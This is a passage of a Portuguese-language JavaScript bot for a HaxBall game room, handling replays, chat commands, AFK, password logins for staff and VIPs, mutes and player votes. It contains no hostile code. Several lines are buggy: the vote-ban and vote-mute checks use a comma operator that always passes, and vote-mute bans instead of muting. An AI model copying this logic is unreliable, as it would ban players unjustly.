    var t = Math.floor(time - Math.floor(time / 60) * 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getSecondsReport(time) {
    var t = Math.round(time);
    return Math.floor(t - getMinutesReport(t) * 60);
}

function getSecondsEmbed(time) {
    var t = Math.round(time);
    var t2 = Math.floor(t - Math.floor(t / 60) * 60);
    return `${Math.floor(t2 / 10)}${Math.floor(t2 % 10)}`;
}

function getTimeGame(time) {
    return `[${getMinutesGame(time)}:${getSecondsGame(time)}]`;
}

function getTimeEmbed(time) {
    return `[${getMinutesEmbed(time)}:${getSecondsEmbed(time)}]`;
}

function getTimeStats(time) {
    if (getHoursStats(time) > 0) {
        return `${getHoursStats(time)}h${getMinutesStats(time)}m`;
    } else {
        return `${getMinutesStats(time)}m`;
    }
}

function getGoalGame() {
    return game.scores.red + game.scores.blue;
}

/* REPORT FUNCTIONS */

function findFirstNumberCharString(str) {
    let str_number = str[str.search(/[0-9]/g)];
    return str_number === undefined ? "0" : str_number;
}

function getIdReport() {
    var d = new Date();
    return `${d.getFullYear() % 100}${d.getMonth() < 9 ? '0' : ''}${d.getMonth() + 1}${d.getDate() < 10 ? '0' : ''}${d.getDate()}${d.getHours() < 10 ? '0' : ''}${d.getHours()}${d.getMinutes() < 10 ? '0' : ''}${d.getMinutes()}${d.getSeconds() < 10 ? '0' : ''}${d.getSeconds()}${findFirstNumberCharString(roomName)}`;
}

function getRecordingName(game) {
    let d = new Date();
    let redCap = game.playerComp[0][0] != undefined ? game.playerComp[0][0].player.name : 'Red';
    let blueCap = game.playerComp[1][0] != undefined ? game.playerComp[1][0].player.name : 'Blue';
    let day = d.getDate() < 10 ? '0' + d.getDate() : d.getDate();
    let month = d.getMonth() < 10 ? '0' + (d.getMonth() + 1) : (d.getMonth() + 1);
    let year = d.getFullYear() % 100 < 10 ? '0' + (d.getFullYear() % 100) : (d.getFullYear() % 100);
    let hour = d.getHours() < 10 ? '0' + d.getHours() : d.getHours();
    let minute = d.getMinutes() < 10 ? '0' + d.getMinutes() : d.getMinutes();
    return `${day}-${month}-${year}-${hour}h${minute}-${redCap}vs${blueCap}.hbr2`;
}

function fetchRecording(game) {
  if (urls.replayLog != "") {

    let scoreRed = game.score.red;
    let scoreBlue = game.score.blue;

    let redPlayers = game.red.map(p => p.name).join(", ") || "Nenhum";
    let bluePlayers = game.blue.map(p => p.name).join(", ") || "Nenhum";

    let form = new FormData();

    form.append(
      "file",
      new File([game.rec], getRecordingName(game), { type: "text/plain" })
    );

    // payload com embed
    form.append(
      "payload_json",
      JSON.stringify({
        username: roomName,
        embeds: [{
          title: "🎥 Replay da Partida",
          color: scoreRed > scoreBlue ? 0xFF0000 : scoreBlue > scoreRed ? 0x0000FF : 0xAAAAAA,
          fields: [
            {
              name: "🔴 Time Vermelho",
              value: `${redPlayers}\n**Placar:** ${scoreRed}`,
              inline: true
            },
            {
              name: "🔵 Time Azul",
              value: `${bluePlayers}\n**Placar:** ${scoreBlue}`,
              inline: true
            }
          ],
          footer: {
            text: `Sala: ${roomName}`
          },
          timestamp: new Date().toISOString()
        }]
      })
    );

    fetch(urls.replayLog, {
      method: "POST",
      body: form
    }).catch(err => console.log("Erro ao enviar replay:", err));
  }
}


/* FEATURE FUNCTIONS */

function getCommand(commandStr) {
    if (commands.hasOwnProperty(commandStr)) return commandStr;
    for (const [key, value] of Object.entries(commands)) {
        for (let alias of value.aliases) {
            if (alias == commandStr) return key;
        }
    }
    return false;
}

function getPlayerComp(player) {
    if (player == null || player.id == 0) return null;
    var comp = game.playerComp;
    var index = comp[0].findIndex((c) => c.auth == authArray[player.id]);
    if (index != -1) return comp[0][index];
    index = comp[1].findIndex((c) => c.auth == authArray[player.id]);
    if (index != -1) return comp[1][index];
    return null;
}

function getTeamArray(team) {
    return team == Team.RED ? teamRed : team == Team.BLUE ? teamBlue : teamSpec;
}

function sendAnnouncementTeam(message, team, color, style, mention) {
    for (let player of team) {
        room.sendAnnouncement(message, player.id, color, style, mention);
    }
}

function teamChat(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    var emoji = player.team == Team.RED ? '🔴' : player.team == Team.BLUE ? '🔵' : '⚪';
    var message = `${emoji} [TEAM] ${player.name}: ${msgArray.join(' ')}`;
    var team = getTeamArray(player.team);
    var color = player.team == Team.RED ? redColor : player.team == Team.BLUE ? blueColor : null;
    var style = 'bold';
    var mention = HaxNotification.CHAT;
    sendAnnouncementTeam(message, team, color, style, mention);
}

function playerChat(player, message) {
    var msgArray = message.split(/ +/);
    if (!msgArray[1]) {
        room.sendAnnouncement(
            `ID do jogador não informado!`,
            player.id,
            errorColor,
            'bold',
            null
        );
        return false
    }
    var playerTargetIndex = playersAll.findIndex(
        (p) => p.id == msgArray[1].substring(1)
    );
    if (playerTargetIndex == -1) {
        room.sendAnnouncement(
            `Jogador inválido, verifique se o ID digitado está correto.`,
            player.id,
            errorColor,
            'bold',
            null
        );
        return false;
    }
    var playerTarget = playersAll[playerTargetIndex];
    if (player.id == playerTarget.id) {
        room.sendAnnouncement(
            `Tu não pode enviar uma mensagem privada para si mesmo!`,
            player.id,
            errorColor,
            'bold',
            null
        );
        return false;
    }
    var messageFrom = `📝 [Mensagem para ${playerTarget.name}] ${player.name}: ${msgArray.slice(2).join(' ')}`

    var messageTo = `📝 [Mensagem de ${player.name}] ${player.name}: ${msgArray.slice(2).join(' ')}`

    room.sendAnnouncement(
        messageFrom,
        player.id,
        privateMessageColor,
        'bold',
        HaxNotification.NONE
    );
    room.sendAnnouncement(
        messageTo,
        playerTarget.id,
        privateMessageColor,
        'bold',
        HaxNotification.NONE
    );
}

/* PHYSICS FUNCTIONS */

function calculateStadiumVariables() {
    if (checkStadiumVariable && teamRed.length + teamBlue.length > 0) {
        checkStadiumVariable = false;
        setTimeout(() => {
            let ballDisc = room.getDiscProperties(0);
            let playerDisc = room.getPlayerDiscProperties(teamRed.concat(teamBlue)[0].id);
            ballRadius = ballDisc.radius;
            playerRadius = playerDisc.radius;
            triggerDistance = ballRadius + playerRadius + 0.01;
            speedCoefficient = 100 / (5 * ballDisc.invMass * (ballDisc.damping ** 60 + 1));
        }, 1);
    }
}

function checkGoalKickTouch(array, index, goal) {
    if (array != null && array.length >= index + 1) {
        var obj = array[index];
        if (obj != null && obj.goal != null && obj.goal == goal) return obj;
    }
    return null;
}

/* BUTTONS */

function topButton() {
    if (teamSpec.length > 0) {
        if (teamRed.length == teamBlue.length && teamSpec.length > 1) {
            room.setPlayerTeam(teamSpec[0].id, Team.RED);
            room.setPlayerTeam(teamSpec[1].id, Team.BLUE);
        } else if (teamRed.length < teamBlue.length)
            room.setPlayerTeam(teamSpec[0].id, Team.RED);
        else room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
    }
}

function randomButton() {
    if (teamSpec.length > 0) {
        if (teamRed.length == teamBlue.length && teamSpec.length > 1) {
            var r = getRandomInt(teamSpec.length);
            room.setPlayerTeam(teamSpec[r].id, Team.RED);
            teamSpec = teamSpec.filter((spec) => spec.id != teamSpec[r].id);
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.BLUE);
        } else if (teamRed.length < teamBlue.length)
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.RED);
        else
            room.setPlayerTeam(teamSpec[getRandomInt(teamSpec.length)].id, Team.BLUE);
    }
}

function blueToSpecButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (var i = 0; i < teamBlue.length; i++) {
        room.setPlayerTeam(teamBlue[teamBlue.length - 1 - i].id, Team.SPECTATORS);
    }
}

function redToSpecButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (var i = 0; i < teamRed.length; i++) {
        room.setPlayerTeam(teamRed[teamRed.length - 1 - i].id, Team.SPECTATORS);
    }
}

function resetButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (let i = 0; i < Math.max(teamRed.length, teamBlue.length); i++) {
        if (Math.max(teamRed.length, teamBlue.length) - teamRed.length - i > 0)
            room.setPlayerTeam(teamBlue[teamBlue.length - 1 - i].id, Team.SPECTATORS);
        else if (Math.max(teamRed.length, teamBlue.length) - teamBlue.length - i > 0)
            room.setPlayerTeam(teamRed[teamRed.length - 1 - i].id, Team.SPECTATORS);
        else break;
    }
    for (let i = 0; i < Math.min(teamRed.length, teamBlue.length); i++) {
        room.setPlayerTeam(
            teamBlue[Math.min(teamRed.length, teamBlue.length) - 1 - i].id,
            Team.SPECTATORS
        );
        room.setPlayerTeam(
            teamRed[Math.min(teamRed.length, teamBlue.length) - 1 - i].id,
            Team.SPECTATORS
        );
    }
}

function swapButton() {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (let player of teamBlue) {
        room.setPlayerTeam(player.id, Team.RED);
    }
    for (let player of teamRed) {
        room.setPlayerTeam(player.id, Team.BLUE);
    }
}

/* COMMAND FUNCTIONS */

/* PLAYER COMMANDS */

function leaveCommand(player, message) {
    if (player.team == 0 || players.length == 1) {
        room.kickPlayer(player.id, 'Tremeu!!! kk', false);
    } else {
        room.sendAnnouncement(`Você não pode usar !bb dentro da partida!`,
            player.id, 0xF8F8FF, 'bold', HaxNotification.CHAT)
    }
}

function helpCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length == 0) {
        var commandString = '[📄] Comandos:';
        for (const [key, value] of Object.entries(commands)) {
            if (!['selecoes', 'brasileiros', 'outros', 'estrangeiros', 'especiais'].includes(key)) {
                if (value.desc && value.roles == Role.PLAYER) commandString += ` !${key},`;
            }
        }
        commandString += ''
        commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        if (tipoVip || player.admin) {
            if (tipoVip == 1) {
                commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00` + '.\n';
            } else if (tipoVip == 2) {
                commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00, !setpro, !setuni, !entrada, !furar` + '.\n';
            } else {
                commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00, !setpro, !setuni, !entrada, !furar, !avatar` + '.\n';
            }
        }
        if (getRole(player) >= Role.ADMIN_TEMP) {
            commandString += `Comandos Admin:`;
            for (const [key, value] of Object.entries(commands)) {
                if (value.desc && value.roles == Role.ADMIN_TEMP) commandString += ` !${key},`;
            }
            if (commandString.slice(commandString.length - 1) == ':')
                commandString += ` None,`;
            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        }
        if (getRole(player) >= Role.MOD) {
            commandString += `Comandos Moderador:`;
            for (const [key, value] of Object.entries(commands)) {
                if (value.desc && value.roles == Role.MOD) commandString += ` !${key},`;
            }
            if (commandString.slice(commandString.length - 1) == ':')
                commandString += ` None,`;
            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        }
        if (getRole(player) >= Role.MASTER) {
            commandString += `Comandos Mestre:`;
            for (const [key, value] of Object.entries(commands)) {
                if (value.desc && value.roles == Role.MASTER) commandString += ` !${key},`;
            }
            if (commandString.slice(commandString.length - 1) == ':') commandString += ` None,`;
            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
        }
        commandString += "\nPara obter informações sobre um comando específico, digite !ajuda [comando].";
        room.sendAnnouncement(
            commandString,
            player.id,
            0xFA5646,
            'bold',
            HaxNotification.CHAT
        );
    } else if (msgArray.length >= 1) {
        var commandName = getCommand(msgArray[0].toLowerCase());
        if (commandName != false && commands[commandName].desc != false)
            room.sendAnnouncement(
                `\'${commandName}\' command :\n${commands[commandName].desc}`,
                player.id,
                infoColor,
                'bold',
                HaxNotification.CHAT
            );
        else
            room.sendAnnouncement(
                `O comando sobre o qual tu tentou obter informações não existe. Para verificar todos os comandos disponíveis, digite !ajuda`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
    }
}

function globalStatsCommandMe(player, message) {
    var stats = new HaxStatistics(player.name)
    if (localStorage.getItem(authArray[player.id])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id]))
    }
    var statsString = printPlayerStatsMe(stats);
    room.sendAnnouncement(`${statsString}`, player.id, infoColor, 'bold', HaxNotification.CHAT);
}

function globalStatsCommand(player, message) {
    var stats = new HaxStatistics(player.name)
    if (localStorage.getItem(authArray[player.id])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id]))
    }
    var statsString = printPlayerStats(stats);
    room.sendAnnouncement(`${statsString}`, null, infoColor, 'bold', HaxNotification.CHAT);
}

function renameCommand(player, message) {
    if (message.length > 20) {
        room.sendAnnouncement(
            `Novo nome muito comprido!`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        return false
    }
    var msgArray = message.split(/ +/).slice(1);
    if (localStorage.getItem(authArray[player.id])) {
        var stats = JSON.parse(localStorage.getItem(authArray[player.id]));
        if (msgArray.length == 0) {
            stats.playerName = player.name;
        } else {
            stats.playerName = msgArray.join(' ');
        }
        localStorage.setItem(authArray[player.id], JSON.stringify(stats));
        room.sendAnnouncement(
            `Tu renomeou com sucesso para ${stats.playerName} !`,
            player.id,
            successColor,
            'bold',
            HaxNotification.CHAT
        );
    } else {
        room.sendAnnouncement(`Tu ainda não jogou um jogo nesta sala!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT
        );
    }
}

function statsLeaderboardCommand(player, message) {
    var key = message.split(/ +/)[0].substring(1).toLowerCase();
    let commandStatKey = commandStatNameTranslation[key] ? commandStatNameTranslation[key] : key;
    printRankings(commandStatKey, player.id);
}

function afkCommand(player, message) {
    if (player.team == Team.SPECTATORS || players.length == 1) {
        if (AFKSet.has(player.id)) {
            if (AFKMinSet.has(player.id)) {
                room.sendAnnouncement(
                    `Há um mínimo de ${minAFKDuration} minuto de tempo AFK. Não abuse do comando!`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT
                );
            } else {
                AFKSet.delete(player.id);
                room.sendAnnouncement(
                    `🌅 ${player.name} não está mais AFK!`,
                    null,
                    0xAA00FF,
                    'bold',
                    null
                );
                updateTeams();
                handlePlayersJoin();
            }
        } else {
            if (AFKCooldownSet.has(player.id)) {
                room.sendAnnouncement(
                    `Tu só pode ficar AFK a cada ${AFKCooldown} minutos. Não abuse do comando!`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT
                );
            } else {
                AFKSet.add(player.id);
                if (!player.admin && tipoVip < 2) {
                    AFKMinSet.add(player.id);
                    AFKCooldownSet.add(player.id);
                    setTimeout(
                        (id) => {
                            AFKMinSet.delete(id);
                        },
                        minAFKDuration * 60 * 1000,
                        player.id
                    );
                    var intervalAFK = setTimeout(
                        (id) => {
                            AFKSet.delete(id);
                            //room.kickPlayer(player.id, "Tempo máximo de AFK atingido! (10 minutos)", false)
                        },
                        maxAFKDuration * 60 * 1000,
                        player.id
                    );
                    setTimeout(
                        (id) => {
                            AFKCooldownSet.delete(id);
                        },
                        AFKCooldown * 60 * 1000,
                        player.id
                    );
                }
                room.setPlayerTeam(player.id, Team.SPECTATORS);
                room.sendAnnouncement(
                    `😴 ${player.name} agora está AFK!`,
                    null,
                    0xAA00FF,
                    'bold',
                    null
                );
                updateTeams();
                handlePlayersLeave();
            }
        }
    } else {
        room.sendAnnouncement(
            `Tu não pode ficar AFK enquanto estiver em uma equipe!`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function afkListCommand(player, message) {
    if (AFKSet.size == 0) {
        room.sendAnnouncement(
            "😴 Não tem ninguém na lista de AFK.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return;
    }
    var cstm = '😴 Lista de AFK: ';
    AFKSet.forEach((_, value) => {
        var p = room.getPlayer(value);
        if (p != null) cstm += p.name + `, `;
    });
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(cstm, player.id, announcementColor, 'bold', null);
}

function masterCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray[0] == masterPassword) {
        if (!masterList.includes(authArray[player.id])) {
            room.setPlayerAdmin(player.id, true);
            adminList = adminList.filter((a) => a[0] != authArray[player.id]);
            masterList.push(authArray[player.id]);
            room.sendAnnouncement(
                `${player.name} logou como mestre!`,
                null,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `Você já é um mestre!`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

function adminCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (parseInt(msgArray[0]) == adminPassword) {
        if (!adminList.includes(authArray[player.id])) {
            room.setPlayerAdmin(player.id, true);
            if (masterList.includes(authArray[player.id])) {
                room.sendAnnouncement(
                    `${player.name} Tu já é um mestre!`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
            adminList.push([authArray[player.id], player.name]);
            adminPassword = getRandomInt2(10000, 99999)
            room.sendAnnouncement(
                `${player.name} logou como admin!`,
                null, announcementColor, 'bold', HaxNotification.CHAT)
            // sendPasswordStaff(player.name)
        } else {
            room.sendAnnouncement(
                `Você já é um admin!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
        }
    }
}

function modCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (parseInt(msgArray[0]) == modsPassword) {
        if (!mods.includes(authArray[player.id])) {
            room.setPlayerAdmin(player.id, true)
            mods.push(authArray[player.id]);
            modsPassword = getRandomInt2(10000, 599999)
            room.sendAnnouncement(`${player.name} Logou como Moderador!`, null, announcementColor, 'bold', HaxNotification.CHAT)
            sendPasswordMod(player.name)
        } else {
            room.sendAnnouncement(
                `Você já é um moderador!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
        }
    }
}

function vipCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    let numVip = parseInt(msgArray[0]) == vip1Password ? 1 : parseInt(msgArray[0]) == vip2Password ? 2 : parseInt(msgArray[0]) == vip3Password ? 3 : parseInt(msgArray[0]) == vip4Password ? 4 : 0
    if (numVip == 0) {
        room.sendAnnouncement(`Senha inválida!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    setVipCommand(player, `!setvip #${player.id} ${numVip}`)
}


/* ADMIN COMMANDS */

function restartCommand(player, message) {
    instantRestart();
}

function stadiumCommand(player, message) {
    var msgArray = message.split(/ +/);
    if (gameState == State.STOP) {
        if (['!map1'].includes(msgArray[0].toLowerCase())) {
            if (!JSON.parse(futsalNovo).name == `${serverName} 🌀 | Flash | 3x3`) {
                room.setDefaultStadium('Big');
            } else {
                room.setCustomStadium(futsalNovo);
            }
            currentStadium = 'map1';

        } else if (['!map2'].includes(msgArray[0].toLowerCase())) {
            if (!JSON.parse(futsalNovo).name == `${serverName} 🌀 | Normal | 3x3`) {
                room.setDefaultStadium('Big');
            } else {
                room.setCustomStadium(futsalNovo);
            }
            currentStadium = 'map2';
        } else {
            room.sendAnnouncement(
                `Estádio não reconhecido.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            )
        }
    } else {
        room.sendAnnouncement(
            `Por favor, pare o jogo antes de usar este comando.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        )
    }
}

function muteCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerMute = room.getPlayer(parseInt(msgArray[0]));
                var minutesMute = muteDuration;
                if (msgArray.length > 1 && parseInt(msgArray[1]) > 0) {
                    minutesMute = parseInt(msgArray[1]);
                }
                if (!playerMute.admin) {
                    var muteObj = new MutePlayer(playerMute.name, playerMute.id, authArray[playerMute.id]);
                    muteObj.setDuration(minutesMute);
                    room.sendAnnouncement(
                        `${playerMute.name} foi mutado por ${minutesMute} minuto(s).`,
                        null,
                        announcementColor,
                        'bold',
                        null
                    );
                } else {
                    room.sendAnnouncement(
                        `Tu não pode silenciar um administrador.`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `Não há jogador com tal ID na sala. Digite "!ajuda mute" para obter mais informações.`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT
                );
            }
        } else {
            room.sendAnnouncement(
                `Formato incorreto de argumento. Digite "!ajuda mute" para obter mais informações.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Número incorreto de argumentos. Digite "!ajuda mute" para obter mais informações.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function unmuteCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerUnmute = room.getPlayer(parseInt(msgArray[0]));
                if (muteArray.getByPlayerId(playerUnmute.id) != null) {
                    var muteObj = muteArray.getByPlayerId(playerUnmute.id);
                    muteObj.remove()
                    room.sendAnnouncement(
                        `${playerUnmute.name} foi desmutado!`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.sendAnnouncement(
                        `Este jogador não está mutado!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `Não há jogador com tal ID na sala. Digite "!ajuda desmutar" para obter mais informações.`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT
                );
            }
        } else if (msgArray[0].length > 0 && parseInt(msgArray[0]) > 0 && muteArray.getById(parseInt(msgArray[0])) != null) {
            var playerUnmute = muteArray.getById(parseInt(msgArray[0]));
            playerUnmute.remove();
            room.sendAnnouncement(
                `${playerUnmute.name} foi desmutado!`,
                null,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `Formato incorreto de argumento. Digite "!ajuda desmutar" para obter mais informações.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Número incorreto de argumentos. Digite "!ajuda desmutar" para obter mais informações.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}
function mostraUnisCategorias(player, message) {
    room.sendAnnouncement(
        categorias,
        player.id,
        infoColor,
        'bold',
        1
    );
    return false
}
function mostraUnisSelecoes(player, message) {
    room.sendAnnouncement(selecoes, player.id, infoColor, 'bold', 1)
    return false
}
function mostraUnisBrasileiros(player, message) {
    room.sendAnnouncement(brasileiros, player.id, infoColor, 'bold', 1)
    return false
}
function mostraUnisOutros(player, message) {
    room.sendAnnouncement(outros, player.id, infoColor, 'bold', 1)
    return false
}
function mostraUnisEstrangeiros(player, message) {
    room.sendAnnouncement(estrangeiros, player.id, infoColor, 'bold', 1)
    return false
}

function mostraUnisvipuni(player, message) {
    room.sendAnnouncement(vipuni, player.id, infoColor, 'bold', 1)
    return false
}
function mostraUnisvipuniEspeciais(player, message) {
    var vipNames = Object.keys(uniVIP2).join(', ');

    room.sendAnnouncement(`Uniformes Vips Especiais: ${vipNames}`, player.id, infoColor, 'bold', 1)
    return false;
}

function mostraUnisEspeciais(player, message) {
    room.sendAnnouncement(especiais, player.id, infoColor, 'bold', 1)
    return false
}
function mostraProvocacoes(player, message) {
    room.sendAnnouncement(provocacoes, player.id, infoColor, 'bold', 1)
    return false
}
function resetarStats(player, message) {
    localStorage.removeItem(authArray[player.id])
    room.sendAnnouncement(`Estatísticas resetadas!`, player.id, infoColor, 'bold', 1)
    return false
}
function mostraStreak(player, message) {
    let msg = 'De um time composto por: '
    if (JSON.parse(localStorage.getItem('streakRecord'))) {
        for (let valor of JSON.parse(localStorage.getItem('streakRecord'))) {
            msg += valor[1] + ', '
        }
    }
    msg = msg.substring(0, msg.length - 2)

    if (streakMax == 0) {
        room.sendAnnouncement(`[PV] Ninguém bateu streak ainda. Streak atual: ${streakMax}`, player.id, infoColor, 'bold', 1)
    } else {
        room.sendAnnouncement(`Maior sequência de vítoria: ${streakMax}\n${msg}`, player.id, infoColor, 'bold', 1)
    }
    return false
}
function voteBan(player, message) {
    var msgArray = message.split(/ +/);
    if (!tipoVip >= 1) {
        room.sendAnnouncement(`Apenas jogadores Vips podem abrir voteban!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (playersAll.some((p) => p.admin)) {
        room.sendAnnouncement(`Tu só pode abrir uma votação quando não tiver adm presente!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (!msgArray[1]) {
        room.sendAnnouncement(`Tu precisa informar o ID do jogador!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (modoVoteBan || modoVoteMute) {
        room.sendAnnouncement(`Já existe uma votação em andamento!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    playerVote = room.getPlayer(parseInt(msgArray[1].substring(1)))
    if (!playerVote) {
        room.sendAnnouncement(`ID do jogador inválido!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (playerVote.id == player.id) {
        room.sendAnnouncement(`Tu não pode abrir votação para si mesmo!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (players.length >= 9) {
        modoVoteBan = true
        room.sendAnnouncement(`${player.name} abriu uma votação para BANIR o jogador: ${playerVote.name}\nSe tu concorda em bani-lo digite !s!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        setTimeout(() => {
            if (votos >= 66, 66 * playersAll.length / 100) {
                room.sendAnnouncement(`Fim da votação! (Aprovada)\nO jogador foi banido!`,
                    null, errorColor, 'bold', HaxNotification.CHAT)
                room.kickPlayer(playerVote.id, 'Banido por votação!', true)
            } else {
                room.sendAnnouncement(`Fim da votação! (Negada)\nNumeros de votos insuficientes. (Necessário 66,66% dos jogadores presentes)`,
                    null, errorColor, 'bold', HaxNotification.CHAT)
            }
            modoVoteBan = false
            votosBan = 0
            votouBan = []
            return false
        }, 30 * 1000)
    } else {
        room.sendAnnouncement(`Tu só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
    }
}


function voteMute(player, message) {
    var msgArray = message.split(/ +/);
    if (!tipoVip >= 1) {
        room.sendAnnouncement(`Apenas jogadores Vips podem abrir votemute!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (playersAll.some((p) => p.admin)) {
        room.sendAnnouncement(`Tu só pode abrir uma votação quando não tiver adm presente!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (!msgArray[1]) {
        room.sendAnnouncement(`Tu precisa informar o ID do jogador!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (modoVoteBan || modoVoteMute) {
        room.sendAnnouncement(`Já existe uma votação em andamento!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    playerVote = room.getPlayer(parseInt(msgArray[1].substring(1)))
    if (!playerVote) {
        room.sendAnnouncement(`ID do jogador inválido!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (playerVote.id == player.id) {
        room.sendAnnouncement(`Tu não pode abrir votação para si mesmo!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (players.length >= 9) {
        modoVoteMute = true
        room.sendAnnouncement(`${player.name} abriu uma votação para MUTAR o jogador: ${playerVote.name}\nSe tu concorda em bani-lo digite !s!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        setTimeout(() => {
            if (votosMute >= 66, 66 * playersAll.length / 100) {
                room.sendAnnouncement(`Fim da votação! (Aprovada)\nO jogador foi mutado!`,
                    null, errorColor, 'bold', HaxNotification.CHAT)
                room.kickPlayer(playerVote.id, 'Banido por votação!', true)
            } else {
                room.sendAnnouncement(`Fim da votação! (Negada)\nNumeros de votos insuficientes. (Necessário 66,66% dos jogadores presentes)`,
                    null, errorColor, 'bold', HaxNotification.CHAT)
            }
            modoVoteMute = false
            votosMute = 0
            votouMute = []
            return false
        }, 30 * 1000)
    } else {
        room.sendAnnouncement(`Tu só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
    }
}
function muteListCommand(player, message) {
    if (muteArray.list.length == 0) {
        room.sendAnnouncement(
            "🔇 Não há ninguém na lista de mutados.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return false;
    }
    var cstm = '🔇 Lista mutados: ';
    for (let mute of muteArray.list) {
        cstm += mute.name + `[${mute.id}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        announcementColor,
        'bold',
        null
    );
}

/* MASTER COMMANDS */

var clearCounting = {};

function clearbansCommand(player, message) {
    var msgArray = message.split(/ +/);

    var playerIdToUnban = parseInt(msgArray[1]);

    if (!isNaN(playerIdToUnban)) {
        desbanirJogador(player, playerIdToUnban).then(() => {

        }).catch((error) => {
            room.sendAnnouncement(`Erro ao desbanir jogador: ${error}`, player.id, 0xc1c1c1, "bold", 1);
            console.error(error);
        });
    } else {
        room.sendAnnouncement("Por favor, digite o ID do jogador corretamente.", player.id, 0xc1c1c1, "bold", 1);
    }

    return false;
}

